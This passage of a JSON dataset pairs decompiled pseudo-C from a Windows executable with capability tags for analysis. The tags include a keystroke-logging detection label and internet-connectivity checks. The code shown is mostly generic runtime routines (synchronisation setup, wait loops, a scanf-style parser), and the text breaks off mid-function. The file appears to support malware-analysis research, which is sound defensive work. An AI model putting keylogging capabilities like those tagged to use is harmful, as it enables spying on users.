            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.14000a250(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    \n    piVar1 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xa8) == 0) goto code_r0x00014000a273;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\ncode_r0x00014000a2e8:\n        fcn.14000ae70(*(iVar4 + 0xa8));\n        iVar4 = *arg1;\n    }\n    else {\n        if (*(iVar4 + 0xa8) != 0) goto code_r0x00014000a2e8;\ncode_r0x00014000a273:\n        *(iVar4 + 0xa8) = 0x140016090;\n        fcn.14000ae70(0x140016090);\n        iVar4 = *arg1;\n    }\n    if (iVar4 == -1) {\n        uVar2 = fcn.14000a150(arg1);\n        iVar4 = *piVar1;\n        if (iVar4 == 0) {\n            iVar3 = fcn.140008fc0();\n            iVar4 = *piVar1;\n            if (*(iVar3 + 0xa8) != 0) {\n                if (iVar4 == 0) {\n                    iVar4 = fcn.140008fc0();\n                }\n                goto code_r0x00014000a360;\n            }\n        }\n        else if (*(iVar4 + 0xa8) != 0) {\ncode_r0x00014000a360:\n            uVar5 = *(iVar4 + 0xa8);\n            goto code_r0x00014000a328;\n        }\n        uVar5 = 0x140016090;\n        *(iVar4 + 0xa8) = 0x140016090;\ncode_r0x00014000a328:\n        fcn.14000aeb0(uVar5);\n        return uVar2;\n    }\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xa8) == 0) goto code_r0x00014000a388;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\n    }\n    else if (*(iVar4 + 0xa8) == 0) {\ncode_r0x00014000a388:\n        uVar5 = 0x140016090;\n        *(iVar4 + 0xa8) = 0x140016090;\n        goto code_r0x00014000a2ae;\n    }\n    uVar5 = *(iVar4 + 0xa8);\ncode_r0x00014000a2ae:\n    fcn.14000aeb0(uVar5);\n    return 0x16;\n}\n",
        "token_count": 731
    },
    "14000a3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.14000a3c0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    \n    if ((*arg1 == 0xffffffffffffffff) && (uVar3 = fcn.14000a250(arg1),  (uVar3 & 0xffffffef) != 0)) {\n        return uVar3;\n    }\n    piVar2 = *0x1400183a0;\n    iVar5 = **0x1400183a0;\n    if (iVar5 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar5 = *piVar2;\n        if (*(iVar4 + 0xa0) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\n            goto code_r0x00014000a480;\n        }\ncode_r0x00014000a3f2:\n        uVar6 = 0x140016098;\n        *(iVar5 + 0xa0) = 0x140016098;\n    }\n    else {\n        if (*(iVar5 + 0xa0) == 0) goto code_r0x00014000a3f2;\ncode_r0x00014000a480:\n        uVar6 = *(iVar5 + 0xa0);\n    }\n    fcn.14000ae70(uVar6);\n    piVar1 = *arg1;\n    uVar3 = 0x16;\n    if ((piVar1 != NULL) && (*piVar1 == -0x454e0f13)) {\n        piVar1[1] = piVar1[1] + 1;\n        uVar3 = 0;\n    }\n    iVar5 = *piVar2;\n    if (iVar5 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar5 = *piVar2;\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x00014000a490;\n        if (iVar5 == 0) {\n            iVar5 = fcn.140008fc0();\n        }\n    }\n    else if (*(iVar5 + 0xa0) == 0) {\ncode_r0x00014000a490:\n        uVar6 = 0x140016098;\n        *(iVar5 + 0xa0) = 0x140016098;\n        goto code_r0x00014000a445;\n    }\n    uVar6 = *(iVar5 + 0xa0);\ncode_r0x00014000a445:\n    fcn.14000aeb0(uVar6);\n    return uVar3;\n}\n",
        "token_count": 623
    },
    "14000b1e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.14000b1e0(ulong *arg1, int32_t *arg2)\n\n{\n    code *pcVar1;\n    ulong *puVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    \n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    if ((arg2 == NULL) || (*arg2 != 1)) {\n        puVar2 = sub.msvcrt.dll_calloc(1, 0xb0);\n        pcVar1 = _sym.imp.KERNEL32.dll_CreateSemaphoreA;\n        if (puVar2 != NULL) {\n            *puVar2 = 0xc0deadbf;\n            puVar2[1] = 0;\n            *(puVar2 + 2) = 0;\n            uVar3 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n            puVar2[0x14] = uVar3;\n            iVar4 = (*pcVar1)(0, 0, 0x7fffffff, 0);\n            puVar2[0x15] = iVar4;\n            pcVar1 = _sym.imp.KERNEL32.dll_InitializeCriticalSection;\n            if (puVar2[0x14] != 0) {\n                if (iVar4 != 0) {\n                    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(puVar2 + 3);\n                    (*pcVar1)(puVar2 + 0xe);\n                    (*pcVar1)(puVar2 + 8);\n                    *puVar2 = 0xc0bab1fd;\n                    *(puVar2 + 0xd) = 0;\n                    *(puVar2 + 0x13) = 1;\n                    *arg1 = puVar2;\n                    return 0;\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                iVar4 = puVar2[0x15];\n            }\n            if (iVar4 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n            }\n            sub.msvcrt.dll_free(puVar2);\n            *arg1 = 0;\n            return 0xb;\n        }\n        uVar3 = 0xc;\n    }\n    else {\n        uVar3 = 0x28;\n    }\n    return uVar3;\n}\n",
        "token_count": 507
    },
    "14000b33": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.14000b330(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    uint uVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg1_00;\n    \n    piVar1 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xb0) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.140008fc0();\n            }\n            goto code_r0x00014000b410;\n        }\ncode_r0x00014000b35d:\n        *(iVar4 + 0xb0) = 0x1400160a0;\n        fcn.14000ae70(0x1400160a0);\n        if (arg1 != NULL) goto code_r0x00014000b379;\ncode_r0x00014000b425:\n        uVar2 = 0x16;\n    }\n    else {\n        if (*(iVar4 + 0xb0) == 0) goto code_r0x00014000b35d;\ncode_r0x00014000b410:\n        fcn.14000ae70(*(iVar4 + 0xb0));\n        if (arg1 == NULL) goto code_r0x00014000b425;\ncode_r0x00014000b379:\n        uVar2 = 0;\n        if (*arg1 == -1) {\n            uVar2 = fcn.14000b1e0(arg1, 0);\n        }\n    }\n    iVar4 = *piVar1;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar1;\n        if (*(iVar3 + 0xb0) != 0) {\n            if (iVar4 == 0) {\n                iVar4 = fcn.140008fc0();\n            }\n            goto code_r0x00014000b3e0;\n        }\n    }\n    else if (*(iVar4 + 0xb0) != 0) {\ncode_r0x00014000b3e0:\n        arg1_00 = *(iVar4 + 0xb0);\n        goto code_r0x00014000b3a7;\n    }\n    arg1_00 = 0x1400160a0;\n    *(iVar4 + 0xb0) = 0x1400160a0;\ncode_r0x00014000b3a7:\n    fcn.14000aeb0(arg1_00);\n    return uVar2;\n}\n",
        "token_count": 609
    },
    "14000b45": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint32_t fcn.14000b450(ulong arg1, ulong arg2, uint64_t arg3)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint64_t arg2_00;\n    uint32_t uVar3;\n    uint64_t arg4;\n    bool bVar4;\n    ulong uStack56;\n    int64_t iStack48;\n    \n    arg4 = arg3 & 0xffffffff;\n    if (arg2 != 1) {\n        uStack56 = arg1;\n        iStack48 = fcn.140007380();\n        if (iStack48 == 0) {\n            uVar1 = 0x14;\n            if (arg4 == -1) {\n                do {\n                    iVar2 = fcn.140009420(arg1, 0x28);\n                    if (iVar2 == 0x80) {\n                        iVar2 = fcn.140007670();\n                        if (iVar2 == 0) {\n                            iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, 0);\n                            return iVar2 != 0;\n                        }\n                        break;\n                    }\n                    if (iVar2 != 0x102) {\n                        if (iVar2 == 0) {\n                            return 0;\n                        }\n                        iVar2 = fcn.140007670();\n                        if (iVar2 == 0) {\n                            return 0x16;\n                        }\n                        break;\n                    }\n                    iVar2 = fcn.140007670();\n                } while (iVar2 == 0);\n                if (arg2 != 2) {\ncode_r0x00014000b709:\n                    fcn.140007840();\n                    return 0x16;\n                }\n            }\n            else {\n                do {\n                    uVar3 = arg4;\n                    arg2_00 = uVar1;\n                    if (uVar3 <= uVar1) {\n                        arg2_00 = arg4;\n                    }\n                    iVar2 = fcn.140009420(arg1, arg2_00);\n                    if (iVar2 == 0x80) {\n                        if (uVar3 <= uVar1) {\n                            uVar1 = 1;\ncode_r0x00014000b6d6:\n                            bVar4 = true;\n                            goto code_r0x00014000b6db;\n                        }\n                        iVar2 = fcn.140007670();\n                        uVar1 = 1;\n                        if (iVar2 != 0) {\n                            return 0x16;\n                        }\ncode_r0x00014000b613:\n                        bVar4 = uVar1 != 0;\ncode_r0x00014000b6db:\n                        if (arg2 == 2) {\n                            return uVar1;\n                        }\n                        if (bVar4) {\n                            fcn.140007840();\n                            return uVar1;\n                        }\n                        return uVar1;\n                    }\n                    if (iVar2 != 0x102) {\n                        if (iVar2 == 0) {\n                            uVar1 = 0;\n                        }\n                        else {\n                            if (uVar3 <= uVar1) {\n                                uVar1 = 0x16;\n                                goto code_r0x00014000b6d6;\n                            }\n                            iVar2 = fcn.140007670();\n                            if (iVar2 != 0) {\n                                return 0x16;\n                            }\n                            uVar1 = 0x16;\n                        }\n                        goto code_r0x00014000b613;\n                    }\n                    uVar3 = uVar3 - arg2_00;\n                    arg4 = uVar3;\n                    if (uVar3 == 0) {\n                        iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, 0);\n                        if (iVar2 == 0) {\n                            return 0;\n                        }\n                        bVar4 = true;\n                        uVar1 = 0x8a;\n                        goto code_r0x00014000b6db;\n                    }\n                    iVar2 = fcn.140007670();\n                    uVar1 = arg2_00;\n                } while (iVar2 == 0);\n            }\n            return 0x16;\n        }\n        do {\n            uVar1 = fcn.1400094c0(2, &uStack56, 0, arg4);\n            if (uVar1 == 0x80) {\n                uVar3 = 1;\ncode_r0x00014000b529:\n                iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(uStack56, 0);\n                if (iVar2 == 0) {\n                    return 0;\n                }\njoined_r0x00014000b689:\n                if (arg2 == 2) {\n                    return uVar3;\n                }\n                iVar2 = fcn.140007670();\n                if (iVar2 == 0) {\n                    return uVar3;\n                }\n                return 0x16;\n            }\n            if (0x80 < uVar1) {\n                uVar3 = 0x8a;\n                if (uVar1 == 0x102) goto code_r0x00014000b529;\ncode_r0x00014000b680:\n                uVar3 = 0x16;\n                goto joined_r0x00014000b689;\n            }\n            if (uVar1 == 0) {\n                return 0;\n            }\n            if (uVar1 != 1) goto code_r0x00014000b680;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)(iStack48);\n            if (arg2 != 2) goto code_r0x00014000b709;\n            fcn.140007840();\n        } while( true );\n    }\n    iVar2 = fcn.140009420(arg1, arg3 & 0xffffffff);\n    if (iVar2 != 0x80) {\n        if (iVar2 != 0x102) {\n            arg2._0_4_ = 0x16;\n            goto joined_r0x00014000b4f6;\n        }\n        arg2._0_4_ = 0x8a;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(arg1, 0);\njoined_r0x00014000b4f6:\n    if (iVar2 == 0) {\n        return 0;\n    }\n    return arg2;\n}\n",
        "token_count": 1405
    },
    "14000b80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.14000b800(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    int64_t arg4;\n    int64_t *piVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    ulong uVar7;\n    \n    piVar2 = *0x1400183a0;\n    if (arg1 == NULL) {\n        return 0x16;\n    }\n    iVar6 = *arg1;\n    if (iVar6 == 0) {\n        return 0x16;\n    }\n    if (iVar6 != -1) {\n        arg4 = iVar6 + 0x98;\n        iVar5 = iVar6 + 0x70;\n        iVar4 = fcn.14000b760(*(iVar6 + 0xa8), 0, 0xffffffff, iVar5);\n        if (iVar4 != 0) {\n            return iVar4;\n        }\n        iVar1 = iVar6 + 0x18;\n        iVar4 = (*_sym.imp.KERNEL32.dll_TryEnterCriticalSection)(iVar1);\n        uVar7 = *(iVar6 + 0xa8);\n        if (iVar4 != 0) {\n            if (*(iVar6 + 8) == *(iVar6 + 0x10) || *(iVar6 + 8) < *(iVar6 + 0x10)) {\n                *arg1 = 0;\n                fcn.14000aec0(uVar7, 1, iVar5, arg4);\n                pcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(iVar6 + 0xa0));\n                (*pcVar3)(*(iVar6 + 0xa8));\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n                pcVar3 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n                (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(iVar1);\n                (*pcVar3)(iVar5);\n                (*pcVar3)(iVar6 + 0x40);\n                sub.msvcrt.dll_free(iVar6);\n                return 0;\n            }\n            iVar4 = fcn.14000aec0(uVar7, 1, iVar5, arg4);\n            if (iVar4 == 0) {\n                iVar4 = 0x10;\n            }\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n            return iVar4;\n        }\n        fcn.14000aec0(uVar7, 1, iVar5, arg4);\n        return 0x10;\n    }\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar5 + 0xb0) == 0) goto code_r0x00014000b929;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x00014000b9a0:\n        uVar7 = *(iVar6 + 0xb0);\n    }\n    else {\n        if (*(iVar6 + 0xb0) != 0) goto code_r0x00014000b9a0;\ncode_r0x00014000b929:\n        uVar7 = 0x1400160a0;\n        *(iVar6 + 0xb0) = 0x1400160a0;\n    }\n    fcn.14000ae70(uVar7);\n    iVar4 = 0x10;\n    if (*arg1 == -1) {\n        *arg1 = 0;\n        iVar4 = 0;\n    }\n    iVar6 = *piVar2;\n    if (iVar6 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar5 + 0xb0) != 0) {\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\n            goto code_r0x00014000b968;\n        }\n    }\n    else if (*(iVar6 + 0xb0) != 0) {\ncode_r0x00014000b968:\n        uVar7 = *(iVar6 + 0xb0);\n        goto code_r0x00014000b96f;\n    }\n    uVar7 = 0x1400160a0;\n    *(iVar6 + 0xb0) = 0x1400160a0;\ncode_r0x00014000b96f:\n    fcn.14000aeb0(uVar7);\n    return iVar4;\n}\n",
        "token_count": 1039
    },
    "14000c84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.14000c840(uint64_t **arg1, ulong *ptr)\n\n{\n    uint64_t *puVar1;\n    int64_t iVar2;\n    uint64_t uVar3;\n    uint64_t *puVar4;\n    \n    sub.msvcrt.dll_free(*ptr);\n    puVar4 = *arg1;\n    *ptr = 0;\n    if (puVar4 != NULL) {\n        do {\n            uVar3 = 0;\n            if (*puVar4 != 0) {\n                do {\n                    sub.msvcrt.dll_free(*puVar4[uVar3 + 2]);\n                    iVar2 = uVar3 + 2;\n                    uVar3 = uVar3 + 1;\n                    *puVar4[iVar2] = 0;\n                } while (uVar3 <= *puVar4 && *puVar4 != uVar3);\n            }\n            puVar1 = puVar4[1];\n            sub.msvcrt.dll_free(puVar4);\n            puVar4 = puVar1;\n        } while (puVar1 != NULL);\n        *arg1 = NULL;\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "14000cb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.14000cb00(int64_t *arg1, uint8_t *arg2, float10 **arg3)\n\n{\n    uint32_t uVar1;\n    uint8_t *puVar2;\n    uint64_t *puVar3;\n    bool bVar4;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    uint8_t uVar10;\n    char cVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint uVar15;\n    uint8_t **ppuVar16;\n    int64_t iVar17;\n    ulong arg2_00;\n    double dVar18;\n    int32_t *piVar19;\n    uint *puVar20;\n    float10 *pfVar21;\n    float10 **ppfVar22;\n    double *pdVar23;\n    uint64_t uVar24;\n    uint8_t *puVar25;\n    uint64_t uVar26;\n    uint8_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint64_t *puVar30;\n    char *pcVar31;\n    uint8_t *puVar32;\n    uint8_t *puVar33;\n    float10 *arg1_00;\n    ulong *puVar34;\n    uint8_t *puVar35;\n    uint64_t uVar36;\n    int64_t iVar37;\n    uint32_t uVar38;\n    bool bVar39;\n    bool bVar40;\n    bool bVar41;\n    float10 fVar42;\n    uchar auVar43 [16];\n    uint32_t uVar44;\n    float10 *pfStack304;\n    uint8_t *puStack296;\n    uint32_t uStack288;\n    uint32_t uStack284;\n    float10 **ppfStack280;\n    float10 *pfStack272;\n    uint64_t uStack256;\n    float10 *pfStack248;\n    uint8_t *puStack232;\n    uint64_t uStack224;\n    double dStack200;\n    float10 fStack184;\n    uchar auStack165 [5];\n    uint64_t *puStack160;\n    double dStack152;\n    uint64_t uStack144;\n    ulong *puStack136;\n    ulong *puStack128;\n    ulong uStack120;\n    ulong auStack112 [6];\n    \n    puStack160 = NULL;\n    dStack152 = 0.0;\n    uStack144 = 0;\n    puStack136 = NULL;\n    if (*arg1 == 0 || arg2 == NULL) {\n        puVar20 = sub.msvcrt.dll__errno();\n        *puVar20 = 0x16;\n        return 0xffffffff;\n    }\n    uStack120 = 0;\n    ppuVar16 = sub.msvcrt.dll_localeconv();\n    puVar2 = *ppuVar16;\n    iVar17 = sub.msvcrt.dll_localeconv();\n    puVar33 = *(iVar17 + 8);\n    puStack296 = puVar33;\n    if ((puVar33 != NULL) && (puStack296 = NULL,  *puVar33 != 0)) {\n        puStack296 = puVar33;\n    }\n    uVar10 = *arg2;\n    if (uVar10 != 0) {\n        uVar38 = 0;\n        uStack284 = 0;\n        uStack288 = 0;\n        uVar13 = 0;\n        auVar43 = ZEXT816(*0x140017f30);\n        pfStack272 = NULL;\n        pfStack304 = NULL;\n        pfStack248 = NULL;\n        uStack256 = 0;\n        uVar44 = *0x140017f40;\n        ppfStack280 = arg3;\ncode_r0x00014000cc17:\n        if (uVar10 < '\\0') {\n            arg2_00 = sub.msvcrt.dll_strlen(arg2);\n            iVar12 = fcn.140014f90(arg2, arg2_00, &uStack120);\n            if (iVar12 < 1) goto code_r0x00014000cc1f;\n            puVar33 = arg2;\n            while ((uVar13 = fcn.14000c9f0(arg1, &dStack152),  uVar13 != 0xffffffff &&\n                   (uVar10 = *puVar33,  puVar33 = puVar33 + 1,  uVar13 == uVar10))) {\n                if (puVar33 == arg2 + (iVar12 - 1) + 1) goto code_r0x00014000cdc9;\n            }\n            if ((*(arg1 + 0x201) & 1) == 0) {\n                sub.msvcrt.dll_ungetc(uVar13, *arg1);\n            }\n            else {\n                iVar12 = *(arg1 + 0x100c);\n                *(arg1 + iVar12 * 4 + 8) = uVar13;\n                *(arg1 + 0x100c) = iVar12 + 1;\n            }\n            dStack152 = dStack152 + -1;\n            puVar3 = puStack160;\n            if (uStack288 == 0) goto code_r0x00014000d845;\n            while (puVar3 != NULL) {\n                puVar30 = puVar3[1];\n                sub.msvcrt.dll_free(puVar3);\n                puVar3 = puVar30;\n            }\n            goto code_r0x00014000cd88;\n        }\ncode_r0x00014000cc1f:\n        uVar10 = *arg2;\n        puVar33 = arg2 + 1;\n        if (uVar10 == 0x25) {\n            uVar29 = arg2[1];\n            uVar1 = 0;\n            uVar28 = arg2[1] - 0x30;\n            if (uVar28 < 10) {\n                puVar25 = arg2 + 2;\n                uVar10 = arg2[2];\n                uVar1 = uVar28;\n                while (uVar10 - 0x30 < 10) {\n                    puVar25 = puVar25 + 1;\n                    uVar1 = (uVar10 - 0x30) + uVar1 * 10;\n                    uVar10 = *puVar25;\n                }\n                if (uVar10 == 0x24) {\n                    uVar29 = puVar25[1];\n                    puVar33 = puVar25 + 1;\n                }\n                else {\n                    uVar1 = 0;\n                }\n            }\n            bVar9 = false;\n            bVar6 = false;\n            bVar5 = false;\n            bVar41 = false;\n            bVar39 = false;\n            bVar4 = false;\n            do {\n                uVar26 = 0;\n                cVar11 = uVar29;\n                if (cVar11 == '*') {\n                    uVar29 = puVar33[1];\n                    bVar4 = true;\n                }\n                else if (cVar11 == '\\'') {\n                    uVar29 = puVar33[1];\n                    if (puStack296 != NULL) {\n                        bVar9 = true;\n                    }\n                }\n                else {\n                    if (cVar11 != 'I') goto code_r0x00014000cf88;\n                    uVar10 = puVar33[1];\n                    uVar29 = uVar10;\n                    if (uVar10 == 0x36) {\n                        if (puVar33[2] != 0x34) goto code_r0x00014000cf24;\n                        uVar29 = puVar33[3];\n                        bVar41 = true;\n                        bVar39 = true;\n                        puVar33 = puVar33 + 2;\n                    }\n                    else if ((uVar10 == 0x33) && (puVar33[2] == 0x32)) {\n                        uVar29 = puVar33[3];\n                        bVar39 = true;\n                        puVar33 = puVar33 + 2;\n                    }\n                    else {\ncode_r0x00014000cf24:\n                        bVar41 = true;\n                        bVar39 = true;\n                    }\n                }\n                puVar33 = puVar33 + 1;\n            } while( true );\n        }\n        iVar12 = sub.msvcrt.dll_isspace(uVar10);\n        if (iVar12 != 0) {\n            uVar38 = 1;\n            goto code_r0x00014000cdc9;\n        }\n        uVar13 = fcn.14000c9f0(arg1, &dStack152);\n        if (uVar13 != 0xffffffff) {\n            if (uVar38 != 0) {\n                iVar12 = sub.msvcrt.dll_isspace(uVar13);\n                while (iVar12 != 0) {\n                    uVar13 = fcn.14000c9f0(arg1, &dStack152);\n                    if (uVar13 == 0xffffffff) {\n                        puVar3 = puStack160;\n                        if (uStack288 != 0) goto joined_r0x00014000cd6a;\n                        goto code_r0x00014000d845;\n                    }\n                    iVar12 = sub.msvcrt.dll_isspace(uVar13);\n                }\n            }\n            if (uVar10 == uVar13) {\n                uVar38 = 0;\n                goto code_r0x00014000cdc9;\n            }\n            if ((*(arg1 + 0x201) & 1) == 0) {\n                sub.msvcrt.dll_ungetc(uVar13, *arg1);\n            }\n            else {\n                iVar12 = *(arg1 + 0x100c);\n                *(arg1 + iVar12 * 4 + 8) = uVar13;\n                *(arg1 + 0x100c) = iVar12 + 1;\n            }\n            dStack152 = dStack152 + -1;\n            puVar3 = puStack160;\n            while (puVar3 != NULL) {\n                puVar30 = puVar3[1];\n                sub.msvcrt.dll_free(puVar3);\n                puVar3 = puVar30;\n            }\n            goto code_r0x00014000ccd1;\n        }\n        puVar3 = puStack160;\n        if (uStack288 == 0) goto code_r0x00014000d845;\n        while (puVar3 != NULL) {\n            puVar30 = puVar3[1];\n            sub.msvcrt.dll_free(puVar3);\n            puVar3 = puVar30;\n        }\n        goto code_r0x00014000cd88;\n    }\n    uStack288 = 0;\n    pfStack304 = NULL;\n    puVar30 = puStack160;\n    if (puStack160 == NULL) goto code_r0x00014000ccf6;\n    do {\n        puVar3 = puVar30[1];\n        sub.msvcrt.dll_free(puVar30);\njoined_r0x00014000ce42:\n        puVar30 = puVar3;\n    } while (puVar3 != NULL);\ncode_r0x00014000ccd1:\n    puStack160 = NULL;\n    if (pfStack304 != NULL) {\n        sub.msvcrt.dll_free(*pfStack304);\n        *pfStack304 = NULL;\n    }\n    goto code_r0x00014000ccf6;\ncode_r0x00014000cf88:\n    iVar12 = 0;\n    uVar28 = uVar29;\n    if (uVar29 - 0x30 < 10) {\n        do {\n            puVar33 = puVar33 + 1;\n            iVar12 = (uVar28 - 0x30) + iVar12 * 10;\n            uVar10 = *puVar33;\n            uVar28 = uVar10;\n            uVar29 = uVar10;\n        } while (uVar10 - 0x30 < 10);\n        if (iVar12 == 0) {\n            iVar12 = -1;\n        }\n    }\n    else {\n        iVar12 = -1;\n    }\n    puVar3 = puStack160;\n    if (uVar29 == '\\0') goto joined_r0x00014000e2eb;\n    // switch table (47 cases) at 0x140017c94\n    switch(uVar29 - 0x4c & 0xff) {\n    case 0:\n    case 0x25:\n    case 0x2e:\n        puStack232 = puVar33 + 1;\n        uVar29 = puVar33[1];\n        bVar41 = true;\n        bVar39 = true;\n        uVar26 = 0;\n        break;\n    default:\ncode_r0x00014000cfe8:\n        uVar29 = *puVar33;\n        puStack232 = puVar33;\n        break;\n    case 0x15:\n        uVar10 = puVar33[1];\n        uVar29 = uVar10;\n        if (((uVar10 & 0xf7) != 0x53) && (uVar10 != 0x73)) goto code_r0x00014000cfe8;\n        puStack232 = puVar33 + 1;\n        uVar26 = 0x200;\n        bVar6 = false;\n        bVar5 = false;\n        break;\n    case 0x1c:\n        uVar29 = puVar33[1];\n        if (puVar33[1] == 0x68) {\n            puStack232 = puVar33 + 2;\n            uVar29 = puVar33[2];\n            uVar26 = 0;\n            bVar6 = true;\n            bVar5 = false;\n        }\n        else {\n            puStack232 = puVar33 + 1;\n            uVar26 = 0;\n            bVar6 = false;\n            bVar5 = true;\n        }\n        break;\n    case 0x1e:\n    case 0x28:\n        puStack232 = puVar33 + 1;\n        uVar29 = puVar33[1];\n        uVar26 = 0;\n        bVar41 = true;\n        break;\n    case 0x20:\n        uVar29 = puVar33[1];\n        if (puVar33[1] == 0x6c) {\n            puStack232 = puVar33 + 2;\n            uVar29 = puVar33[2];\n            uVar26 = 0;\n            bVar6 = false;\n            bVar5 = false;\n            bVar41 = true;\n            bVar39 = true;\n        }\n        else {\n            puStack232 = puVar33 + 1;\n            uVar26 = 0;\n            bVar6 = false;\n            bVar5 = false;\n            bVar39 = true;\n        }\n        break;\n    case 0x21:\n        uVar29 = puVar33[1];\n        if (puVar33[1] == 0x6c) {\n            puStack232 = puVar33 + 2;\n            uVar29 = puVar33[2];\n            uVar26 = 0x404;\n            bVar6 = false;\n            bVar5 = false;\n            bVar39 = true;\n        }\n        else {\n            puStack232 = puVar33 + 1;\n            uVar26 = 0x400;\n        }\n    }\n    bVar8 = false;\n    bVar40 = false;\n    bVar7 = false;\n    cVar11 = uVar29;\n    if (cVar11 == '\\0') goto joined_r0x00014000f053;\n    puVar33 = puStack232 + 1;\n    if (((uVar38 != 0) || (0x2b < uVar29 - 0x43)) || ((0x80101000001U >> (uVar29 - 0x43 & 0x3f) & 1) == 0)) {\n        puVar20 = sub.msvcrt.dll__errno();\n        uVar15 = *puVar20;\n        puVar20 = sub.msvcrt.dll__errno();\n        *puVar20 = 0;\n        do {\n            if (uVar13 == 0xffffffff) goto code_r0x00014000d732;\n            uVar13 = fcn.14000c9f0(arg1, &dStack152);\n            if (uVar13 == 0xffffffff) {\n                piVar19 = 